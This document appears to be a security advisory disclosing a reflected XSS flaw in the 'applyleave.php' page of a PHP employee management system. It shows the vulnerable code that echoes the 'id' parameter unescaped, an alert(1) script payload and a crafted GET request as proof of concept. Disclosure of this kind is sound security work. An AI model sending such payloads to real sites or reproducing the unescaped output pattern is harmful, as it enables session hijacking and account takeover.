## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/applyleave.php` contains a Reflected XSS vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects HTML/JavaScript into the “Apply Leave” page navigation links (and other URL contexts). If a victim visits the URL, the injected script may execute in the victim’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the victim)
- Phishing/UI manipulation (tampering with page content)

### Payload:

"><sCrIpT>alert(1)</ScRiPt>

```
"><sCrIpT>alert(1)</ScRiPt>
```

### POC:

The vulnerable endpoint is `GET /applyleave.php?id=...`. The `id` query parameter is inserted into multiple `href` attributes without HTML escaping:

<ul id="navli">

  <li><a class="homeblack" href="eloginwel.php?id=<?php echo $id?>"">HOME</a></li>

  <li><a class="homeblack" href="myprofile.php?id=<?php echo $id?>"">My Profile</a></li>

  <li><a class="homeblack" href="empproject.php?id=<?php echo $id?>"">My Projects</a></li>

  <li><a class="homered" href="applyleave.php?id=<?php echo $id?>"">Apply Leave</a></li>

</ul>

Send the following request (URL-encoded payload):

GET /applyleave.php?id=%22%3E%3CsCrIpT%3Ealert%281%29%3C%2FScRiPt%3E HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The response HTML contains the injected string inside the navigation link `href` attributes (as shown in your response snippet). When rendered in a browser, the injected JavaScript executes (e.g., `alert(1)`), confirming reflected XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409154815708](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409154815708.png)